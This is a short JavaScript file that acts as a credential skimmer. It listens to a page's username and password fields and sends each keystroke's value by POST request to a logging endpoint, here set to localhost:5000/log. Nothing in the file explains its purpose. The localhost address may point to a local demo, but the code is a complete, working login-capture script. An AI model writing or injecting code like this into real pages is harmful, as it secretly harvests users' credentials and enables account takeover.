let url = "http://localhost:5000/log";

let usernameField = document.getElementById("username");
let passwordField = document.getElementById("password");

document.addEventListener("DOMContentLoaded", function () {
    

    usernameField.addEventListener("input", function (event) {
        let data = {
            "username": usernameField.value,
        };
        fetch(url, {
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": JSON.stringify(data),
        }).then(response => response.json())
    });

    passwordField.addEventListener("input", function (event) {
        let data = {
            "password": passwordField.value,
        };
        fetch(url, {
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": JSON.stringify(data),
        }).then(response => response.json())
    });


});